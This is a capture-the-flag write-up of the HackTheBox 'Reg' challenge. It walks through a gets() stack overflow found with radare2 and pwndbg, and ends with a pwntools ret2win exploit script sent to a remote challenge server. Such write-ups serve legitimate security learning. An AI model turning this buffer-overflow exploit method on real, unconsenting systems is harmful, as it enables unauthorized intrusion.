---
layout: post
title: Binary Exploitation&#58; HacktheBox/Reg
---

# HacktheBox Reg Write-up

Check the file type:
```
└─$ file reg
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped
```

Check securities:
```
└─$ checksec --file=reg   
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80 Symbols	  No	0		3		reg
```

Running the program, we are just prompted for our name and a string is printed out.
```
└─$ ./reg   
Enter your name : asdfasdf
Registered!
```

### Reversing

For this challenge, I am using radare2 for the reversing portion. I think this is an extremely powerful tool that I would like to learn more about.

After tracing through main, we get to a function called ```run()```. In that function, we see a ```gets()``` call, which as we know, will always yield a pwnable binary. Keep in mind, I am unable to copy/paste from the radare2 window into vim (as far as I know at the moment!).

The ```gets()``` function saves our input in a variable that is ```0x30``` bytes away from the base address. Our return address should be ```0x30 + 8``` bytes away from our input. Let;s test in ```pwndbg```.
```
pwndbg> i f
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x40129e in run; saved rip = 0x6161616161616168
 called by frame at 0x7fffffffde18
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08
pwndbg> x 0x7fffffffde08
0x7fffffffde08:	0x61616168
pwndbg> x/gx 0x7fffffffde08
0x7fffffffde08:	0x6161616161616168
```

Since ```0x68``` is the letter ```h``` and ```0x61``` is the letter ```a```, we can use the ```cyclic -l``` command to calculate our offset.
```
pwndbg> cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

We were correct! Now we know our offset.

### Pwn

Now we need to find what we want ```rip``` to point to at the end of the ```run()``` function. 

We see a function called ```winner()``` that reads in our flag and prints it to the screen. This is a run-of-the-mill ret2win challenge. All we need to do is input junk bytes up to our offset, then append the address of ```winner()``` to our payload. Since PIE is disabled, we can copy the address straight from the disassembly.

Time to write the exploit.
```python
#!/usr/bin/env python3

from pwn import *

payload = b"A"*56 + p64(0x00401206)

p = remote("165.22.118.93", 30404)

p.sendline(payload)

p.interactive()
```

Et Voila!
